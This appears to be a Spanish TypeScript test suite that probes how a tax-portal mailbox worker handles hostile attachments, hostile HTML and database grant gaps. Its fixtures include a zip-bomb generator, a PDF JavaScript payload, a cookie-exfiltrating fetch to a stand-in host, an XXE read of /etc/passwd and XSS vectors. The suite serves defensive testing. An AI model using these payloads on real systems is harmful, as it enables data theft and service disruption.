/* eslint-disable @typescript-eslint/no-explicit-any -- filas de BD dinámicas en pruebas */
// Spec 023 · T16 · ronda adversarial 1 (worker y BD, integración con PostgreSQL, Redis y BullMQ reales, un doble de `SolPortal`
// y un storage en memoria). Caja negra: adjuntos y HTML hostiles (ZIP bomba, PDF con JavaScript, MIME falso, XXE, script,
// on*, comentarios anidados, entidades) y datos del portal que la BD no admite tal cual. Caja blanca: `abrir-mensaje.ts`
// (conteo del `resultado` frente a lo guardado con ids repetidos), `revisar-buzon.ts` (inserción por mensaje) y los grants de
// 0054 (INSERT del worker sin acotar columnas).
// Hallazgos marcados con `it.fails` (H-023-1-n); sin la marca, quedan en rojo.
import { randomBytes, randomUUID } from "node:crypto";
import type { ContappDb } from "@contapp/db";
import type { AdjuntoSol } from "@contapp/sunat";
import type { Redis } from "ioredis";
import {
  afterAll,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest";
import {
  arrancar007b,
  esperarTerminal,
  guardarCredencial,
  type FilaTrabajo,
} from "../../../test/procesadores-007b.js";
import {
  AlmacenControlado,
  EscenarioBuzon,
  PortalControlado,
  adjuntosDe,
  avisosBuzon,
  comun,
  critico,
  encolarAbrir,
  encolarRevisar,
  insertarMensajeAdmin,
  mensajeDe,
  mensajesDe,
  sha256,
  type Mundo,
  type MsgPrueba,
} from "../../../test/buzon.js";
import {
  asignarResponsable,
  auditoriaDe,
  limpiarFilas017,
} from "../../../test/notificaciones.js";
import { canario } from "../../../test/soporte.js";
import {
  conectarRedis,
  crearDbAdmin,
  crearDbRol,
  fijarConfig,
  limpiarPrefijo,
  nuevoPrefijo,
  restaurarConfig,
} from "../../../test/trabajos.js";

vi.setConfig({ testTimeout: 150_000, hookTimeout: 60_000 });

let admin: ContappDb;
let backend: ContappDb;
let worker: ContappDb;
let redis: Redis;
let e: EscenarioBuzon;
let prefijo = nuevoPrefijo();
const prefijos = [prefijo];
let entornoAnterior: string | undefined;

beforeEach(() => {
  prefijo = nuevoPrefijo();
  prefijos.push(prefijo);
});

beforeAll(async () => {
  entornoAnterior = process.env.BUZON_PROGRAMADOR;
  process.env.BUZON_PROGRAMADOR = "off";
  admin = crearDbAdmin();
  backend = crearDbRol("contapp_backend");
  worker = crearDbRol("contapp_worker");
  redis = conectarRedis();
  e = new EscenarioBuzon(admin);
  await fijarConfig(admin, "sol", {
    global: 4,
    tenant: 2,
    espera: 0,
    reintentos: 2,
    base: 100,
  });
});

afterAll(async () => {
  if (entornoAnterior === undefined) delete process.env.BUZON_PROGRAMADOR;
  else process.env.BUZON_PROGRAMADOR = entornoAnterior;
  await restaurarConfig(admin).catch(() => undefined);
  await limpiarFilas017(admin, e?.estudios ?? []).catch(() => undefined);
  await e?.limpiar();
  for (const x of prefijos)
    await limpiarPrefijo(redis, x).catch(() => undefined);
  redis?.disconnect();
  await Promise.all([backend?.close(), worker?.close(), admin?.close()]);
});

// ---------------------------------------------------------------------------------------------------------------
// Soporte local
// ---------------------------------------------------------------------------------------------------------------

async function mundo(): Promise<Mundo> {
  const T = await e.estudio();
  await e.usuario(T, "dueno");
  const u = await e.usuario(T, "contador");
  const c = await e.cliente(T);
  await asignarResponsable(admin, T, c.id, u);
  await guardarCredencial(backend, T, c.id, "sol", {
    usuario: canario("usuario_sol"),
    clave: canario("clave_sol"),
  });
  return { T, u, c };
}

async function conWorker<T>(
  portal: PortalControlado,
  almacen: AlmacenControlado | undefined,
  fn: () => Promise<T>,
): Promise<T> {
  const w = await arrancar007b({
    prefijo,
    solPortal: portal,
    ...(almacen === undefined ? {} : { storage: almacen }),
  } as Parameters<typeof arrancar007b>[0]);
  try {
    return await fn();
  } finally {
    await w.detener({ esperaMs: 2000 });
  }
}

const adj = (idSunat: string, nombre: string, bytes: Buffer): AdjuntoSol => ({
  idSunat,
  nombre,
  bytes,
});
const pdf = (extra = 1500): Buffer =>
  Buffer.concat([Buffer.from("%PDF-1.7\n"), randomBytes(extra)]);

interface Abierto {
  m: Mundo;
  mensajeId: string;
  portal: PortalControlado;
  almacen: AlmacenControlado;
  f: FilaTrabajo;
}

/** Un mensaje ya capturado (sin contenido) que el portal abre con `contenido` y `adjuntos`; encola «Abrir» y espera el fin. */
async function abrirCon(o: {
  contenido?: { formato: "texto" | "html"; cuerpo: string };
  adjuntos?: AdjuntoSol[];
}): Promise<Abierto> {
  const m = await mundo();
  const adjuntos = o.adjuntos ?? [];
  const mensajeId = await insertarMensajeAdmin(admin, m.T, m.c.id, {
    idSunat: "AB-1",
    adjuntosDeclarados: adjuntos.length,
  });
  const portal = new PortalControlado().buzon(m.c.ruc, [
    comun("AB-1", 1, {
      contenido: o.contenido ?? { formato: "texto", cuerpo: "Cuerpo" },
      adjuntos: adjuntos.map((a) => ({ idSunat: a.idSunat, nombre: a.nombre })),
      adjuntosBytes: adjuntos,
    }),
  ]);
  const almacen = new AlmacenControlado();
  const f = await conWorker(portal, almacen, async () => {
    const { id } = await encolarAbrir(backend, redis, prefijo, m, mensajeId);
    return esperarTerminal(e, id, 60_000);
  });
  return { m, mensajeId, portal, almacen, f };
}

const resultadoDe = (f: FilaTrabajo): Record<string, unknown> =>
  (f as { resultado?: Record<string, unknown> }).resultado ?? {};

const reRuta = (m: Mundo, ext: string): RegExp =>
  new RegExp(
    `^buzon/${m.T}/${m.c.id}/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\.${ext}$`,
  );

/** ZIP «bomba»: cabecera local que declara 4 GiB descomprimidos (método deflate) sobre unos pocos KiB. Nunca debe abrirse. */
function zipBomba(): Buffer {
  const cab = Buffer.alloc(30);
  cab.writeUInt32LE(0x04034b50, 0);
  cab.writeUInt16LE(20, 4);
  cab.writeUInt16LE(0, 6);
  cab.writeUInt16LE(8, 8);
  cab.writeUInt32LE(0xffffffff, 18); // tamaño comprimido
  cab.writeUInt32LE(0xffffffff, 22); // tamaño descomprimido
  cab.writeUInt16LE(5, 26);
  return Buffer.concat([cab, Buffer.from("x.bin"), randomBytes(4096)]);
}

// ---------------------------------------------------------------------------------------------------------------
// Adjuntos hostiles (CA-8, D-4)
// ---------------------------------------------------------------------------------------------------------------

describe("Adjuntos hostiles: ZIP bomba, PDF con JavaScript, MIME falso y XXE", () => {
  it("se guardan opacos e idénticos (o se omiten por firma), con rutas uuid propias, sin abrirse ni interpretarse", async () => {
    const bomba = zipBomba();
    const pdfJs = Buffer.from(
      "%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n" +
        "2 0 obj<</S/JavaScript/JS(app.alert('x');this.submitForm('https://x.invalid/'))>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n",
      "latin1",
    );
    const png = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      randomBytes(256),
    ]);
    const htmlComoPdf = Buffer.from(
      "<html><body><script>fetch('//x.invalid/'+document.cookie)</script></body></html>",
    );
    const xxe = Buffer.from(
      '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    );
    const svg = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>',
    );
    const r = await abrirCon({
      adjuntos: [
        adj("Z1", "anexos.zip", bomba),
        adj("Z2", "resolucion.pdf", pdfJs),
        adj("Z3", "programa.exe", png),
        adj("Z4", "coactiva.pdf", htmlComoPdf),
        adj("Z5", "comprobante.xml", xxe),
        adj("Z6", "logo.svg", svg),
      ],
    });
    expect([r.f.estado, r.f.motivo]).toEqual(["completado", null]);
    const por = Object.fromEntries(
      (await adjuntosDe(admin, r.mensajeId)).map((x) => [x.id_sunat, x]),
    );
    const esperado: Record<string, [string, string, Buffer]> = {
      Z1: ["application/zip", "zip", bomba],
      Z2: ["application/pdf", "pdf", pdfJs],
      Z3: ["image/png", "png", png],
      Z5: ["application/xml", "xml", xxe],
    };
    for (const [id, [mime, ext, bytes]] of Object.entries(esperado)) {
      const f = por[id]!;
      expect(f.omitido, id).toBeNull();
      expect(f.mime, id).toBe(mime);
      expect(f.ruta, id).toMatch(reRuta(r.m, ext));
      expect(f.tamano, id).toBe(bytes.length);
      const guardado = Buffer.from(await r.almacen.leer(f.ruta!));
      expect(Buffer.compare(guardado, bytes), id).toBe(0);
      expect(sha256(guardado).equals(f.sha256!), id).toBe(true);
    }
    // Lo declarado no cuenta: HTML con nombre .pdf y SVG (sin prólogo XML) quedan fuera por firma.
    expect([por["Z4"]!.omitido, por["Z6"]!.omitido]).toEqual(["mime", "mime"]);
    // Contenido + 4 adjuntos: nada más se escribió, todo bajo la carpeta del cliente.
    expect(r.almacen.rutas()).toHaveLength(5);
    for (const ruta of r.almacen.rutas())
      expect(ruta).toMatch(reRuta(r.m, "[a-z0-9]+"));
  });
});

// ---------------------------------------------------------------------------------------------------------------
// HTML hostil (CA-8, D-3)
// ---------------------------------------------------------------------------------------------------------------

describe("HTML hostil del contenido (CA-8, D-3)", () => {
  it("script, img onerror, svg, javascript:, comentarios anidados, mayúsculas y entidades: solo queda texto", async () => {
    const cuerpo =
      "<p>Estimado contribuyente</p>" +
      '<img src=x onerror="alert(1)">' +
      "<svg><script>alert(3)</script><foreignObject><p>oculto-svg</p></foreignObject></svg>" +
      "<!-- a <!-- oculto-comentario --> visible -->" +
      "<a href=\"javascript:alert(4)\" onclick='alert(6)'>enlace</a>" +
      "<SCRIPT type=text/javascript >alert(5)</SCRIPT >" +
      "<style>p{background:url(javascript:alert(7))}</style>" +
      '<iframe srcdoc="<script>alert(8)</script>"></iframe>' +
      "&lt;b&gt;literal&lt;/b&gt; &#60;i&#62;num&#x3c;/i&#x3E;" +
      "<p>Fin</p>";
    const r = await abrirCon({ contenido: { formato: "html", cuerpo } });
    expect([r.f.estado, r.f.motivo]).toEqual(["completado", null]);
    const fila = await mensajeDe(admin, r.m.c.id, "AB-1");
    const texto = Buffer.from(
      await r.almacen.leer(fila.contenido_ruta!),
    ).toString("utf8");
    for (const visible of [
      "Estimado contribuyente",
      "enlace",
      "visible -->",
      "Fin",
    ])
      expect(texto, visible).toContain(visible);
    for (const peligroso of [
      "onerror",
      "onclick",
      "javascript:",
      "<img",
      "<svg",
      "<script",
      "<SCRIPT",
      "<iframe",
      "srcdoc",
      "alert(",
      "oculto",
    ])
      expect(texto, peligroso).not.toContain(peligroso);
    // Lo escapado por SUNAT queda como texto literal (decisión de texto-plano.ts); nunca se vuelve a interpretar.
    expect(texto).toContain("<b>literal</b>");
    expect(texto).toContain("<i>num</i>");
  });
});

// ---------------------------------------------------------------------------------------------------------------
// H-023-1-2: el `resultado` de «Abrir» cuenta lo que no guardó
// ---------------------------------------------------------------------------------------------------------------

describe("H-023-1-2 · ids de adjunto repetidos por el portal (D-10, CA-8)", () => {
  it.fails(
    "resultado.adjuntos y resultado.omitidos coinciden con lo guardado en BD y con la auditoría buzon.contenido_obtenido",
    async () => {
      const r = await abrirCon({
        adjuntos: [
          adj("D1", "uno.pdf", pdf()),
          adj("D1", "uno-copia.pdf", pdf()),
          adj("D2", "falso.pdf", Buffer.from("MZ ejecutable")),
          adj("D2", "bueno.pdf", pdf()),
        ],
      });
      expect([r.f.estado, r.f.motivo]).toEqual(["completado", null]);
      const filas = await adjuntosDe(admin, r.mensajeId);
      const enBd = {
        adjuntos: filas.filter((x) => x.ruta !== null).length,
        omitidos: filas.filter((x) => x.omitido !== null).length,
      };
      const aud = (
        await auditoriaDe(admin, r.m.T, "buzon.contenido_obtenido")
      ).find((a: any) => a.entidad_id === r.mensajeId) as any;
      expect(aud?.datos).toMatchObject(enBd);
      const res = resultadoDe(r.f);
      expect({ adjuntos: res.adjuntos, omitidos: res.omitidos }).toEqual(enBd);
    },
  );
});

// ---------------------------------------------------------------------------------------------------------------
// H-023-1-3: un adjunto con id de SUNAT que la BD no admite tumba la apertura entera
// ---------------------------------------------------------------------------------------------------------------

describe("H-023-1-3 · id de adjunto hostil (CA-4, CA-8, D-4)", () => {
  it.fails(
    "un id de 65 caracteres o con NUL no impide guardar el contenido ni los demás adjuntos, y el portal se llama una vez",
    async () => {
      const r = await abrirCon({
        contenido: {
          formato: "texto",
          cuerpo: "Resolución coactiva: pague en 7 días.",
        },
        adjuntos: [
          adj("OK-1", "resolucion.pdf", pdf()),
          adj("X".repeat(65), "largo.pdf", pdf()),
          adj("N\u0000UL", "nul.pdf", pdf()),
        ],
      });
      // Hoy: el INSERT del adjunto viola el CHECK (1..64) o PostgreSQL rechaza el NUL; la transacción entera se revierte,
      // el mensaje queda sin contenido y el portal ya lo marcó como leído en SUNAT (RF-126).
      expect(r.portal.llamadasObtenerDe("AB-1")).toBe(1);
      expect([r.f.estado, r.f.motivo]).toEqual(["completado", null]);
      const fila = await mensajeDe(admin, r.m.c.id, "AB-1");
      expect(fila.contenido_ruta).not.toBeNull();
      const filas = await adjuntosDe(admin, r.mensajeId);
      expect(filas.find((x) => x.id_sunat === "OK-1")?.ruta).toMatch(
        reRuta(r.m, "pdf"),
      );
    },
  );
});

// ---------------------------------------------------------------------------------------------------------------
// H-023-1-4: un mensaje con un asunto que la BD no admite tumba la captura y deja sin capturar lo más antiguo
// ---------------------------------------------------------------------------------------------------------------

describe("H-023-1-4 · mensaje hostil en el listado (CA-3, CA-6, D-9)", () => {
  it.fails(
    "un asunto con NUL no impide capturar ni avisar la coactiva más antigua de la misma página",
    async () => {
      const m = await mundo();
      const buzon: MsgPrueba[] = [
        comun("H-NUEVO", 1),
        comun("H-NUL", 2, { asunto: "Aviso\u0000 de cobranza" }),
        critico("H-COAC", "coactiva", 3),
      ];
      const portal = new PortalControlado().buzon(m.c.ruc, buzon);
      const f = await conWorker(portal, undefined, async () => {
        const id = await encolarRevisar(backend, redis, prefijo, m);
        return esperarTerminal(e, id, 60_000);
      });
      const ids = (await mensajesDe(admin, m.c.id)).map((x) => x.id_sunat);
      // Hoy: la captura termina en error en H-NUL (PostgreSQL rechaza el NUL); H-COAC no se guarda ni se avisa, y cada captura
      // siguiente vuelve a caer en el mismo punto.
      expect(ids).toContain("H-COAC");
      expect((await avisosBuzon(admin, m.T, m.c.id)).length).toBeGreaterThan(0);
      expect(f.estado).toBe("completado");
    },
  );
});

// ---------------------------------------------------------------------------------------------------------------
// H-023-1-5: el INSERT del worker no está acotado por columnas (0054)
// ---------------------------------------------------------------------------------------------------------------

describe("H-023-1-5 · el worker escribe al insertar columnas que el plan reserva a otros (0054, D-3, D-5)", () => {
  it.fails(
    "estado: el worker no puede fijar ultima_programada_en ni ultima_solicitud_en (solo encolar_buzon_programados y el backend)",
    async () => {
      const m = await mundo();
      const intento = worker.withTenant({ tenantId: m.T }, (tx) =>
        tx.query(
          `insert into buzon_estado_cliente (cliente_id, ultima_programada_en, ultima_solicitud_en)
           values ($1, 'infinity', 'infinity')`,
          [m.c.id],
        ),
      );
      // Hoy se inserta: con la franja en 'infinity' el programador nunca vuelve a encolar al cliente.
      await expect(intento).rejects.toMatchObject({ code: "42501" });
    },
  );

  it.fails(
    "mensaje: el worker no puede insertar un mensaje con el contenido ya fijado (se saltaría la auditoría buzon.contenido_obtenido)",
    async () => {
      const m = await mundo();
      const ruta = `buzon/${m.T}/${m.c.id}/${randomUUID()}.txt`;
      const intento = worker.withTenant({ tenantId: m.T }, (tx) =>
        tx.query(
          `insert into buzon_mensaje (cliente_id, id_sunat, asunto, remitente, fecha, categoria, critico, version_catalogo,
                                      contenido_ruta, contenido_bytes, contenido_obtenido_en)
           values ($1, 'W-1', 'Boletín', 'SUNAT', now() - interval '40 days', 'otro', false, 1, $2, 10, now())`,
          [m.c.id, ruta],
        ),
      );
      let rechazado = false;
      try {
        await intento;
      } catch {
        rechazado = true;
      }
      const aud = await auditoriaDe(admin, m.T, "buzon.contenido_obtenido");
      // O la BD lo rechaza, o queda la auditoría de la obtención: hoy no pasa ninguna de las dos.
      expect(rechazado || aud.length > 0).toBe(true);
    },
  );
});
